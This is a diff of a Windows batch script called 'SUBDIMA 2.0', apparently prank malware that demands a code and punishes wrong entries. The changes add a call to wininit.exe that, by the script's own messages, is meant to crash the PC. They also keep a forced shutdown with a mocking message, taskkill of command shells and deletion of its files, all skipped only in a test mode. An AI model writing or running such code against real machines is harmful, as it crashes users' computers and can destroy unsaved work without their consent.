@@ -7,7 +7,6 @@
 ::============================================================
 @echo off
 title SUBDIMA 2.0
-set %shell%=%2
 echo %* | findstr /I "tstmd"
 if /I "%errorlevel%" == "0" set test=1 && title SubDima 2.0 (TEST MODE)
 if /I "%errorlevel%" == "1" set test=0
@@ -54,7 +53,7 @@ exit
 :firstinit
 echo Preparing first initialization...
 set attempts=3
-if /I "%test%" == "0" start "%shell%" /min "%tmp%\SUBDIMA\taskender.bat"
+if /I "%test%" == "0" start "" /min "%tmp%\SUBDIMA\taskender.bat"
 echo Generating random key...
 set key=%random%
 cls
@@ -109,8 +108,17 @@ echo. I'm sorry.. You entered the wrong code too many times.
 echo. Seems like you're fucked...
 timeout /t 2 /nobreak > nul
 if /I "%test%" == "0" (
-    start %shell% /c "timeout /t 5 /nobreak > nul & shutdown -s -t 10 -c "Planned Reboot: HAHA SUBDIMA GO BRRR" & del /Q "%tmp%\SUBDIMA""
+    wininit.exe
 )
+echo. Your PC should've crashed now...
+echo.
+echo. Ah well...
+timeout /t 3 /nobreak > nul
+if /I "%test%" == "0" (
+    goto :remove
+)
+echo Press any key to exit...
+pause > nul
 taskkill -im cmd.exe /f > nul
 taskkill -im tcc.exe /f > nul
 exit
@@ -123,8 +131,13 @@ echo.
 echo. Bye!!
 timeout /t 4 /nobreak > nul
 if /I "%test%" == "0" (
-    start %shell% /c "timeout /t 5 /nobreak > nul & shutdown -s -t 10 -c "Planned Reboot: Removing SubDima" & del /Q "%tmp%\SUBDIMA""
+    goto :remove
 )
 taskkill -im cmd.exe /f > nul
 taskkill -im tcc.exe /f > nul
+exit
+
+:remove
+shutdown -s -t 10 -c "Planned Reboot: Removing SubDima"
+del /Q "%tmp%\SUBDIMA"
 exit
